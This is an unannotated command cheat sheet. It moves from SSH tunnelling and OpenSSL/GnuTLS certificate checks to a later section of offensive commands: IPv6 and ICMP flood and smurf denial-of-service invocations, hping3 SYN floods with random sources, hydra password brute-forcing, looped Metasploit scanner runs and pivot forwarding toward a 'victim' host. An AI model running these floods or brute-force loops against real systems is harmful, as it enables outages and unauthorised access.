# GSSAPICleanupCredentials yes

# AllowAgentForwarding yes
# AllowTcpForwarding yes
# GatewayPorts no
# X11Forwarding no
# X11DisplayOffset 10
# X11UseLocalhost yes
# PermitTTY yes

# PrintLastLog yes
# TCPKeepAlive yes
# UseLogin no
# PermitUserEnvironment no
# Compression delayed
# ClientAliveInterval 0
# ClientAliveCountMax 3
# UseDNS no
# PidFile /run/sshd.pid
# MaxStartups 10:30:100
# PermitTunnel no
# ChrootDirectory none
# VersionAddendum none

# - Example of overriding settings on a per-user basis - #
# Match User anoncvs
#	 X11Forwarding no
#	 AllowTcpForwarding no
#	 PermitTTY no









file.txt host-two:/tmp


joe@host-two:/www/*.html /www/tmp


-r joe@host-two:/www /www/tmp


## connecting to a remote SSH server.
ssh -v -p 22 -C neo@remoteserver


Copy Files over SSH with SCP
scp mypic.png neo@remoteserver:/media/data/mypic_2.png


SSH Tunnel (port forward)
ssh  -L 9999:127.0.0.1:80 user@remoteserver


SSH Reverse Tunnel
setup a listening port on the remote server that will connect back to a local port on our localhost
ssh -v -R 0.0.0.0:1999:127.0.0.1:902 192.168.1.100 user@remoteserver


SSH Reverse Proxy
establishing a SOCKS proxy with our ssh connection
 the proxy is listening at the remote server end.
ssh -v -R 0.0.0.0:1999 192.168.1.100 user@remoteserver





# start a tunnel from some machine's port 80 to your local post 2001
ssh -N -L2001:localhost:80 somemachine

# directly ssh to host B that is only accessible through host A
ssh -t hostA ssh hostB

C h e ck f ing e rp rint
ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub


## View ~/.ssh/known_hosts key information
ssh-keygen -l -f ~/.ssh/known_hosts


# Mount folder/filesystem through SSH
sshfs name@server:/path/to/folder /path/to/mount/point

## copy from host1 to host2, through your host
ssh root@host1 "cd /somedir/tocopy/ && tar -cf - ." | ssh root@host2 "cd /samedir/tocopyto/ && tar -xf -"

## Connect via SSH to VirtualBox guest VM without knowing IP address
ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0/V4/IP" | awk '{ print $2 }'`


## Backup a local drive into a file on the remote host via ssh
dd if=/dev/sda | ssh user@server 'dd of=sda.img'

##-===================================-##
##     [+] Single use vnc-over-ssh connection 
##-===================================-##
ssh -f -L 5900:localhost:5900 your.ssh.server "x11vnc -safer -localhost -nopw -once -display :0"; vinagre localhost:5900



ssh remotehost 'dpkg --get-selections' | dpkg --set-selections && dselect install

## "Clone" a list of installed packages from one Debian/Ubuntu Server to another
apt-get install `ssh root@host_you_want_to_clone "dpkg -l | grep ii" | awk '{print $2}'`



##-==============================================-##
##     [+] SSH connection through host in the middle
ssh -t reachable_host ssh unreachable_host


ssh -L localport:desthost:destport user@gate

ssh -R destport:desthost:localport user@gate


ssh -X user@gate
# To force X forwarding


##-==============================================-##
##     [+] SSH Local Port Forwarding

ssh -L 0.0.0.0:4444:<attacking.machine.ip.address>:4444 <local_hostname>

ssh -L 10443:<victim.ip.address>:443 user@<pivot_host>

ssh -L 0.0.0.0:45001:<victim.ip.address>:80 user@<pivot_host>



##-==============================================-##
##     [+] Generate SSH host keys

ssh-keygen -t rsa -b 8192 -a 23 -C “root@myhostname” -f /etc/ssh/ssh\_host\_rsa\_key -N ‘’

ssh-keygen -t ed25519 -b 521 -a 64 -C “root@myhostname” -f /etc/ssh/ssh\_host\_ed25519\_key -N ‘’
ssh-keygen -t rsa -b 4096 -C “ts-user1-myhostname” -f ~/.ssh/ts-myhostname\_rsa

ssh-keygen -t rsa -b 4096 -C “putty-user1-myhostname” -f ~/.ssh/putty-myhostname\_rsa

ssh-keygen -t ed25519 -b 521 -C “cygwin-user1-myhostname” -f ~/.ssh/cygwin-myhostname\_ed25519

ssh-keygen -t ed25519 -b 521 -C “thor-user1-myhostname” -f ~/.ssh/thor-myhostname\_ed25519

chmod 0600 /home/user1/.ssh/\*

chmod 0644 /home/user1/.ssh/\*.pub

chmod 0644 /home/user1/authorized\_keys



ssh -R 1080 host


HTTP_PROXY=socks5://localhost:1080



ssh -N -D localhost:1080 your.home.pc -p 443 - tsocks configuration in your /etc/tsocks.conf (for the previous): server = 127.0.0.1 server_port = 1080 






##-===================================================-##
##      [+] Use SSH Tunneling To Connect To Mullvads VPN Servers			
##-===================================================-##
## ---------------------------------------------------------------------------------------- ##
##   [?] This involves logging in to our bridge servers 
##          and then running a local SOCKS proxy 
##          that you can connect OpenVPN to
## ---------------------------------------------------------------------------------------- ##
##   [?]  https://mullvad.net/en/help/ssh-and-mullvad-vpn/
## ---------------------------------------------------------------------------------------- ##

nslookup us-chi-br-001.mullvad.net

##  Non-authoritative answer:
##  Name:	us-chi-br-001.mullvad.net
##  Address: 68.235.43.114



echo "##-==============================================-##"
echo "         [+] SSH tunneling to connect to Mullvads VPN servers		"
echo "##-==============================================-##"
ssh -f -N -D 1234 mullvad@193.138.219.43







Certificate

cd /etc/stunnel
openssl genrsa -out stunnel.key 2048
openssl req -new -key stunnel.key -out stunnel.csr
openssl x509 -req -days 365 -in stunnel.csr -signkey stunnel.key -out stunnel.crt
cat stunnel.crt stunnel.key > stunnel.pem
chmod 640 stunnel.key stunnel.pem


gnutls-cli $Domain --x509keyfile $MYKEY --x509certfile $MYCERT

gnutls-cli --starttls-proto smtp --port 25 localhost

telnet mailserver.example.org 25



openssl s_client -starttls smtp -connect mailserver.example.org:25 -crlf


openssl s_client -connect smtp.office365.com:587 -starttls smtp
openssl s_client -starttls smtp -crlf -connect smtp.gmail.com:587
openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null |
openssl s_client -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null




openssl s_client -CApath /etc/ssl/certs -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null
openssl s_client -CApath /etc/ssl/certs -connect $Domain:443

openssl s_client -CApath /etc/pki/tls/$File.crt -connect $Domain:443



openssl genrsa -out CA.key 4096
openssl req -new -key CA.key -out CA.csr
openssl x509 -req -days 365 -in CA.csr -out CA.crt -signkey CA.key
 
openssl genrsa -out server.key 4096
openssl req -new -key server.key -out server.csr
openssl ca -in server.csr -cert CA.crt -keyfile CA.key -out server.crt
 
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.csr
openssl ca -in client.csr -cert CA.crt -keyfile CA.key -out client.crt




openssl s_client 
    -showcerts 
    -connect test.example.com:443 
    -cert client.crt 
    -key client.key 
    -CAfile CA.crt

wget 
    --post-data 'id=1234' 
    --certificate=client.crt 
    --ca-certificate=CA.crt  
    https://test.example.com:443




SSLCertificateFile /etc/pki/tls/certs/GODADDYCERTNAME.crt
 
SSLCertificateKeyFile /etc/pki/tls/private/KEYNAME.key
 
#SSLCertificateChainFile /etc/pki/tls/certs/CertName.crt
 
SSLCACertificateFile /etc/pki/tls/certs/gd_bundle-g2-g1.crt



# Pull certs to a local file for parsing
echo -n | openssl s_client -showcerts -connect smtp.gmail.com:465 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > allgcert

# Count number of certs currently being used (can change from time to time)
numcerts=$(echo -n | openssl s_client -showcerts -connect smtp.gmail.com:465 | grep -c "i:")


# Parses out certificate issuer names for installation
echo -n | openssl s_client -showcerts -connect smtp.gmail.com:465 | grep i: | sed -e 's,.*=,,' > allgcertnames

for i in $(seq 1 $numcerts) ; do
  certutil -A -n "$(sed -n ${i}p allgcertnames)" -t "TC,," -d $certdirectory -i gcert${i}

smtp-gmail-openssl-s_client-certificate-issuer-parsing




##-================================-##
##     [+] Test for Weak SSL Ciphers
##-================================-##

## -------------------------------------------------------------------------- ##
##    [?] If you get a Certificate Back, 
##    [?] The Server is Accepting Weak SSL Ciphers
## -------------------------------------------------------------------------- ##

openssl s_client -connect [$Host]:[$SSLPort] -cipher LOW
openssl s_client -connect $Host:$SSLPort -cipher LOW
openssl s_client -connect $Host:$Port -cipher LOW


openssl s_client -host localhost -port $Port
openssl s_client -host $Domain -port 443

openssl s_client -connect $Domain:443 -state -nbio -servername $Domain

echo "hola" | ssmtp $User@gmail.com -v


openssl s_client -connect auth.startssl.com:443 



openssl s_client -host $Domain -port 443 | openssl x509 -noout -dates -subject -issuer 



sudo -u postfix openssl s_client -showcerts -starttls smtp -connect smtp.gmail.com:587 < /dev/null 2> /dev/null


gnutls-cli $Domain --x509keyfile $MYKEY --x509certfile $MYCERT


debug services with starttls capability.

gnutls-cli-debug --starttls-proto smtp --port 25 localhost


danetool --check mullvad.net --proto tcp --port 443

gnutls-cli --print-cert mullvad.net

gnutls-cli -p 443 mullvad.net

GnuTLS: 
gnutls-cli --x509certfile ${OUTFILE}.crt --x509keyfile ${OUTFILE}.key


openssl s_client -connect api.github.com:443 -no_ssl2 -ign_eof



##-=======================================================================-##
##   [+] Use gnutls-cli to get a copy of the server certificate chain:
##-=======================================================================-##
echo | gnutls-cli -p 443 $Domain --save-cert $Chain.pem




gnutls-cli --save-cert=mullvad.pem mullvad.net:443


TLS connection over port 443 debug level 5
gnutls-cli -d 5 mullvad.net -p 443

Test gmail’s IMAP connection over 993:
gnutls-cli -d 5 imap.gmail.com -p 993


echo | gnutls-cli -p 443 $Domain --save-cert $Chain.pem


gnutls-cli -p 443 gist.github.com --protocols ssl3


openssl s_client -connect gist.github.com:443


gnutls-cli --port $Port --sni-hostname $Domain --alpn ssh/2.0 %h


--list
--verbose

--dane
--ocsp
--starttls
--starttls-proto=ldap
https, ftp, smtp, imap, ldap, xmpp, lmtp, pop3, nntp, sieve, postgres

--port=

--post-handshake-auth


--print-cert

--save-ocsp=
--save-client-trace=
--save-server-trace=
--logfile=

--x509cafile=
--x509crlfile=
--x509keyfile=
--x509certfile=





$ openssl s_client -connect ldaphost:636 -ssl2
$ openssl s_client -connect ldaphost:636 -ssl3
$ openssl s_client -connect ldaphost:636 -stls1








gnutls-cli-debug --verbose localhost



## start the server again:
gnutls-serv --http --x509cafile x509-ca.pem --x509keyfile x509-server-key.pem --x509certfile x509-server.pem
           




certtool --generate-privkey > x509-ca-key.pem


##-==============================================-##
##     [+] Calculate the fingerprint of RiseupCA.pem
certtool -i < RiseupCA.pem |egrep -A 1 'SHA256 fingerprint'
openssl x509 -sha256 -in RiseupCA.pem -noout -fingerprint


certtool -i < RiseupCA.pem |egrep -A 1 'SHA256 fingerprint'



openssl x509 -text -noout -in $1 | sed -e '/Public-Key/!d' -e 's/\s\+Public-Key: (\([0-9]\+\) bit)/\1 bits/'


certtool -i < $1 | sed -e '/^.*Algorithm Security Level/!d' -e 's/.*(\([0-9]\+\) bits).*/\1 bits/'


openssl x509 -text -noout -in $1 | sed -e '/Signature Algorithm/!d' -e 's/\s\+Signature Algorithm:\s\+\(.\+\)/\1/' | head -n1


certtool -i < $1 | sed -e '/^.*Signature Algorithm:/!d' -e 's/.*:\s\+\(.*\)/\1/'





keytool -printcert -jarfile file.apk
keytool -printcert -file X:\Path\To\CERT.RSA



Android APK signatures use by definition self-signed certificates.


apksigner verify --verbose --print-certs "Signal-website-universal-release-4.49.13.apk"


## ------------------------------------------------------------------------------------------------------------- ##
##  Verifies
##  Verified using v1 scheme (JAR signing): true
##  Verified using v2 scheme (APK Signature Scheme v2): true
##  Verified using v3 scheme (APK Signature Scheme v3): true
##  Number of signers: 1
##  Signer #1 certificate DN: CN=Whisper Systems, OU=Research and Development, O=Whisper Systems, L=Pittsburgh, ST=PA, C=US
##  Signer #1 certificate SHA-256 digest: 29f34e5f27f211b424bc5bf9d67162c0eafba2da35af35c16416fc446276ba26
##  Signer #1 certificate SHA-1 digest: 45989dc9ad8728c2aa9a82fa55503e34a8879374
##  Signer #1 certificate MD5 digest: d90db364e32fa3a7bda4c290fb65e310
##  Signer #1 key algorithm: RSA
##  Signer #1 key size (bits): 1024
##  Signer #1 public key SHA-256 digest: 75336a3cc9edb64202cd77cd4caa6396a9b5fc3c78c58660313c7098ea248a55
##  Signer #1 public key SHA-1 digest: b46cbed18d6fbbe42045fdb93f5032c943d80266
##  Signer #1 public key MD5 digest: 0f9c33bbd45db0218c86ac378067538d
## ------------------------------------------------------------------------------------------------------------- ##



openssl x509 -in cert.pem -fingerprint -noout




##-===================================================-##
##     [+] generate Self-Signed SSL Certificate+Key  (One-liner)
##-===================================================-##
## ----------------------------------------------------------------------- ##
##     [?] without any annoying prompts or CSRs
## ----------------------------------------------------------------------- ##
openssl req -new -newkey rsa:4096 -days 3650 -nodes -x509 -subj "/C=<Country Code>/ST=<State>/L=<City>/O=<Organization>/CN=<Common Name>" -keyout certificate.key -out certificate.crt

## ------------------------------------- ##
##     [?] Sample Output:
## ------------------------------------- ##
certificate.key
certificate.crt










##-==============================================-##
##     [+] Calculate the fingerprint of Protonmail-com.pem:

openssl x509 -sha256 -in protonmail-com.pem -noout -fingerprint
SHA256 Fingerprint=23:00:B8:54:21:8A:3D:4F:4F:E7:8B:58:9E:ED:FA:BB:16:65:51:89:D8:71:00:85:A5:67:D0:33:AA:60:3B:CC

openssl x509 -sha256 -in mullvad-n.pem -noout -fingerprint


23:00:B8:54:21:8A:3D:4F:4F:E7:8B:58:9E:ED:FA:BB:16:65:51:89:D8:71:00:85:A5:67:D0:33:AA:60:3B:CC
23:00:B8:54:21:8A:3D:4F:4F:E7:8B:58:9E:ED:FA:BB:16:65:51:89:D8:71:00:85:A5:67:D0:33:AA:60:3B:CC



certtool --certificate-info < protonmail-com.pem
certtool --certificate-info < protonmail-com.pem | grep sha256
sha256:2300b854218a3d4f4fe78b589eedfabb16655189d8710085a567d033aa603bcc


certtool --certificate-info < mullvad-n.pem
certtool --certificate-info < mullvad-n.pem | grep sha256


head -n -1 protonmail-com.pem | tail -n +2 | base64 -d | sha256sum


##-====================================-##
##     [+] Print some info about a PKCS#12 file:

openssl pkcs12 -in $File.p12 -info -noout


##-==========================-##
##  [+] Check certificate
##-==========================-##
openssl x509 -in $Certificate.crt -text -noout


##-=========================================-##
##  [+] View The Contents of The CSR File
##-=========================================-##
openssl req -text -in $Certificate.csr 



## Specify a date the file must be newer than:
curl ‐z "Jan 12 2012" http://remote.server.com/remote.html




##-=================================-##
##     [+] Check Site SSL Certificate Dates:

echo | openssl s_client -connect $Site.com:443 2>/dev/null | openssl x509 -dates -noout
echo | openssl s_client -connect mail.protonmail.com:443 2>/dev/null | openssl x509 -dates -noout
notBefore=Oct 25 10:30:50 2019 GMT
notAfter=Oct 25 10:30:50 2021 GMT


echo | openssl s_client -connect $Site.com:443 2>/dev/null | openssl x509 -dates -noout
echo | openssl s_client -connect mullvad.net:443 2>/dev/null | openssl x509 -dates -noout


openssl x509 -enddate -noout -in $1 | cut -d'=' -f2-

certtool -i < "$1" | sed -e '/Not\sAfter/!d' -e 's/^.*:\s\(.*\)/\1/'



## --------------------------------------------------------------------- ##
##     [?] Testing connection to the remote host
## --------------------------------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ------------------------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ------------------------------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## --------------------------------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## --------------------------------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


echo | openssl s_client -connect mullvad.net:443 -showcerts
echo | openssl s_client -showcerts -servername mullvad.net -connect mullvad.net:443
echo | openssl s_client -tls1_2 -connect mullvad.net:443

openssl x509 -noout -issuer -subject -fingerprint -dates
 | openssl x509 -noout -fingerprint -sha1
 | openssl x509 -noout -fingerprint -sha256
 | openssl x509 -noout -issuer_hash
 | openssl x509 -noout -subject
 | openssl x509 -in "${REQUIRED_CA}" -noout -subject

echo | openssl s_client -connect mullvad.net:443 2>/dev/null | openssl x509 -noout -issuer -subject -fingerprint -dates


openssl s_client -servername "$1" -connect "$1":443 | openssl x509 -fingerprint -sha256 -noout

openssl s_client -CApath /etc/ssl/certs -connect mullvad.net:443 -debug


openssl s_client -connect  | openssl x509 -text
##-=============================================-##
##   [+] Connect To Google.com using OpenSSL
##   [+] Examine The x509 Certificate:
##-=============================================-##
echo | openssl s_client -connect www.google.com:443 2>/dev/null | openssl x509 -text





Testing an MTA Using openssl s_client
openssl s_client -connect puppy.yourdomain.com:25 -starttls smtp


connect to a non-MTA client such as an IMAP server. Enter the following:
openssl s_client -connect puppy.yourdomain.com:993

openssl s_client -tls1 -connect imap.gmail.com:993
openssl s_client -ssl3 -connect imap.gmail.com:993


echo QUIT | openssl s_client -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect ecdsa.scotthelme.co.uk:443 -status






##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25




openssl s_server -key puppy.yourdomain.com.key.pem \
-cert puppy.yourdomain.com.cert.pem




##-=======================================================-##
##   [+] Request Information on the Chain Certificates.
##-=======================================================-##
ocsptool --ask --load-chain $Chain.pem


##-=======================================================-##
##   [+] Ask information on a particular certificate 
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] using --load-cert and --load-issuer
## ------------------------------------------------------- ##
ocsptool --ask http://ocsp.CAcert.org/ --load-chain $Chain.pem



## Create an OCSP request and write it to a file:
openssl ocsp -issuer issuer.pem -cert c1.pem -cert c2.pem -reqout req.der


## Send a query to an OCSP responder with URL 
## http://ocsp.myhost.com/ 
## save the response to a file, 
## print it out in text form, 
## and verify the response:
openssl ocsp -issuer issuer.pem -cert c1.pem -cert c2.pem -url http://ocsp.myhost.com/ -resp_text -respout resp.der


## Read in an OCSP response and print out text form:
openssl ocsp -respin resp.der -text -noverify


Print information about an OCSP request

ocsptool -i -Q ocsp-request.der



sent to standard input like this:

cat ocsp-request.der | ocsptool --request-info


## OCSP server on port 8888 using a standard ca configuration, 
## and a separate responder certificate. 
## All requests and responses are printed to a file.
openssl ocsp -index demoCA/index.txt -port 8888 -rsigner rcert.pem -CA demoCA/cacert.pem -text -out log.txt


## As above but exit after processing one request:
openssl ocsp -index demoCA/index.txt -port 8888 -rsigner rcert.pem -CA demoCA/cacert.pem -nrequest 1


## Query status information using an internally generated request:
openssl ocsp -index demoCA/index.txt -rsigner rcert.pem -CA demoCA/cacert.pem -issuer demoCA/cacert.pem -serial 1



-rsigner $File				##  The certificate to sign OCSP responses with.


-reqin $File					##  Read OCSP request or response file from file.

-rsigner $File				##  The certificate to sign OCSP responses with.

-resp_key_id $KeyID		##  Identify the signer certificate using the key ID, 
										##  [?]  default is to use the subject name.

-rkey $File				##  The private key to sign OCSP responses with



##-=========================================-##
##    [+] Query status information using request read from a file, 
## and write the response to a second file.
openssl ocsp -index demoCA/index.txt -rsigner $File.pem -CA $CA.pem -reqin $Req.der -respout resp.der


Generate an RSA private key

certtool -p --rsa --bits=keysize

Generate a certificate signing request

certtool -q --load-privkey private_key --outfile file

Generate a self-signed certificate

certtool -s --load-privkey private_key --outfile file



##-===========================================================-##
##   [+] Decode the private key and view its contents:

openssl rsa -text -in yourdomain.key -noout



##-===========================================================-##
##   [+] Extract your public key:

openssl rsa -in yourdomain.key -pubout -out yourdomain_public.key










openssl ts -query -data hash.log -out hash.log.tsq -cert
tsget -h https://freetsa.org/tsr hash.log.tsq
curl -s -H "Content-Type: application/timestamp-query" --data-binary "@hash.log.tsq" https://freetsa.org/tsr > hash.log.tsr
openssl ts -reply -in hash.log.tsr -text



##-=============================================-##
##   [+] FreeTSA
##-=============================================-##
## --------------------------------------------- ##
##   [?] the CA cert is fetched from FreeTSA:
## --------------------------------------------- ##
curl http://freetsa.org/files/cacert.pem > $cacert.pem

##-================================-##
##   [+] Validate The Timestamp:
##-================================-##
openssl ts -verify -in $hash.log.tsr -queryfile $hash.log.tsq -CAfile $cacert.pem


## ----------------------------------- ##
##   [?] Timestamp Query ( tsq ) 
##   [?] Timestamp Reponse ( tsr )
## ----------------------------------- ##







wget https://dl.eff.org/certbot-auto
sudo mv certbot-auto /usr/local/bin/certbot-auto
sudo chown root /usr/local/bin/certbot-auto
sudo chmod 0755 /usr/local/bin/certbot-auto
/usr/local/bin/certbot-auto --help

To check the integrity of the certbot-auto script, run:

wget -N https://dl.eff.org/certbot-auto.asc
gpg2 --keyserver ipv4.pool.sks-keyservers.net --recv-key A2CFB51FA275A7286234E7B24D17C995CD9775F2
gpg2 --trusted-key 4D17C995CD9775F2 --verify certbot-auto.asc /usr/local/bin/certbot-auto


gpg: Signature made Mon 10 Jun 2019 06:24:40 PM EDT
gpg:                using RSA key A2CFB51FA275A7286234E7B24D17C995CD9775F2
gpg: key 4D17C995CD9775F2 marked as ultimately trusted
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: next trustdb check due at 2027-11-22
gpg: Good signature from "Let's Encrypt Client Team <letsencrypt-client@eff.org>" [ultimate]



./certbot-auto certonly --manual --preferred-challenges dns -d '*.default.yourdomain.com'



certbot-auto --help all



https://hub.docker.com/u/certbot

sudo docker run -it --rm --name certbot \
            -v "/etc/letsencrypt:/etc/letsencrypt" \
            -v "/var/lib/letsencrypt:/var/lib/letsencrypt" \
            certbot/certbot certonly























https://dl.eff.org/certbot-auto.asc


wafw00f http://$TARGET

whatweb http://$TARGET

nikto -C all -h http://$TARGET 





knockpy -w /pentest/lists/dns/namelist.txt $TARGET



atk6-flood_router26 eth0
flood_router26 -HFD -s eth0
fake_router6 eth0 1::/64 &
fake_router26 -A $i::/64 -R ::/0 -R 2000::/3 -R fc00::/7 -n 1 eth0
fake_router26 -A $i::/64 -R ::/0 -R 2000::/3 -R fc00::/7 -D ff02::fb -n 1 eth0
fake_router26 -A $i::/64 -R ::/0 -n 1 eth0
fake_router26 -A $i::/64 -R ::/0 -R 2000::/3 -R fc00::/7 -R 2000::/4 -R2000::/5 -R 2000::/6 -R 2000::/7 -R2000::/8 -R 2000::/9 -R 2000::/10 -R 2000::/11 -R 2000::/12 -D ff02::fb -n 1 eth0
flood_router26 eth0



IPv4 Smurf Flood

hping3 -1 --flood -a [target_ip] [target_broadcast_ip]



hping3 -S -p 80 --flood --rand-source vg-suricata-04




#!/bin/bash
for i in {100..999}
do
    atk6-fake_router26 -A 1:c0f:fee:$i::/64 -n 1 eth0
done


dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'






IPv6 DAD DoS
 dos-new-ip6 eth0
 
IPv6 Neighbor Advertisement Flood
flood_advertise6 eth0 2001::7
 
IPv6 DHCP Client Flood
flood_dhcpc6 eth0 2001::7
 
IPv6 MLD Report Flood
 flood_mld6 eth0 2001::7 
flood_mld26 eth0 2001::7
 
IPv6 MLD Router Advertisement Flood
flood_mldrouter6 eth0 2001::7
 
IPv6 Router Advertisement Flood
flood_router6 eth0
 
IPv6 Neighbor Solicitation Flood
flood_solicitate6 eth0 2001::7
 
IPv6 ICMP error TooBig message Flood
ndpexhaust26 -PTUR -s [tester_ipv6] eth0 2001::7
 
IPv6 Smurf Flood
smurf6 eth0 2001::7 [target_multicast]









xsstracer $TARGET 80
	#sqlmap -u http://$TARGET --crawl 3 --dbs --answer="redirect=Y" --batch 
	#echo -e "$COLOR1Starting XSSer...$RESET" && xsser -u http://$TARGET -c10 --Cw=200 --auto --save --follow-redirects | egrep "Injection:|Final Results:|Injections:|Failed:|Successfull:|Accur:"
	#wpscan --url http://$TARGET --batch
	#python $CMSMAP -t http://$TARGET
	#hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -f  -m /


sslscan --show-certificate $Domain

sslyze --regular $Domain:443

sslscan --tlsall $Domain:443
sslscan --show-certificate --no-ciphersuites 

nmap --script=ssl-enum-ciphers.nse 

openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect 


nmap --script=ssl-enum-ciphers.nse 




https://www.ssllabs.com/ssltest/analyze.html?d=mullvad.net



dnsenum.pl --enum -f dns.txt --update a -r $domain >> ~/Enumeration/$domain

dnstracer $Domain

amass enum -src -ip -d DOMAIN.com


fierce -dns $domain

tcptraceroute -i eth0 $domain

nmap -PN -n -F -T4 -sV -A -oG temp.txt $domain

httprint -h www.$domain -s signatures.txt -P0

list-urls.py http://www.$domain

amap -d $IP $PORT



xprobe2 









snmpwalk -c public -v1 $IP
snmpwalk public -v1 192.168.9.201 1 |grep 77.1.2.25 |cut -d” “ -f4


nmap -p161 -sU --open -T5 -v -n 192.168.1.X


nikto -h $IP -p $PORT


nikto -h http://192.168.1.X


smbclient -L\\ -N -I $IP

enum4linux $IP



dnsenum.pl --enum -f dns.txt --update a -r $URL
fierce.pl -dns $URL
lbd.sh $URL


## ---------------------------------------------- ##
##   [+] nbtscan (NetBIOS scanner)
## ---------------------------------------------- ##
nbtscan -f $File
nbtscan -r $IP/$CIDR


## ------------------------------------------- ##
##   [+] Enum4linux bash-loop:
## ------------------------------------------- ##
for targets in $(cat $File>); do enum4linux $targets; done



nmblookup -A "$1" | grep "<00>" | grep -v "<GROUP>" | cut -d " " -f1


nikto -h "$1":"$port"




grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u

nmap -p21,445 --script="vuln and safe" ipHost -oN vulnSafeScan

##  Low Hanging Fruit
nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN LHF


nmap -PN -n -F -T4 -sV -A -oG temp.txt url
dnsenum.pl --dnsserver 8.8.8.8 --enum -f dns-big.txt --update a -r microsoft.com
nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr <target>


# Nmap UDP Reflector Scanning and filtering - DNS: 
nmap -sU -pU:53 --script=dns-recursion -Pn -n -v $IP | grep -B3 open | egrep -o "([0-9]{1,3}\.){3}[0-9]{1,3}"  > dnslist.txt



nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted


##-====================================-##
##  [?] Unix TCP stacks reply with 
##        A+ SYN/ACK or a RST/ACK
##-====================================-##
##  [?] get the expected behavior of a RST:
##-====================================-##
hping -S -F -p 53 -s 53 127.0.0.1



##-====================================-##
##  [?] Unix TCP stacks reply with 
##        A+ SYN/ACK or a RST/ACK
##-====================================-##
hping -S -F -p 53 -s 53 127.0.0.1



hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -f 
smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "smtp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=25 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 25 --script=smtp-* $TARGET









enum4linux $TARGET
samrdump.py $TARGET
nbtscan $TARGET
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "smb" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=139 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS VERBOSE=false E; done;
nmap --script=/usr/share/nmap/scripts/smb-check-vulns.nse --script=/usr/share/nmap/scripts/smb-os-discovery.nse --script=/usr/share/nmap/scripts/smb-enum-domains.nse --script=/usr/share/nmap/scripts/smb-server-stats.nse --script=/usr/share/nmap/scripts/smb-ls.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-054.nse --script=/usr/share/nmap/scripts/smb-vuln-ms10-061.nse --script=/usr/share/nmap/scripts/smb-system-info.nse --script=/usr/share/nmap/scripts/smb-enum-shares.nse --script=/usr/share/nmap/scripts/smb-enum-users.nse --script=/usr/share/nmap/scripts/smbv2-enabled.nse --script=/usr/share/nmap/scripts/smb-mbenum.nse --script-args=unsafe=1 -p 139 $TARGET



showmount -a -d -e $TARGET
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "nfs" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=111 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 111 --script=nfs-* $TARGET




rpcinfo -p $TARGET
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "rpc" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "dce" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 135 --script=rpc* $TARGET








hydra -L $USER_FILE -P $PASS_FILE $TARGET ftp -f
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ftp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RHOST=$TARGET RHOSTS=$TARGET RPORT=21 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 21 --script=ftp-* $TARGET





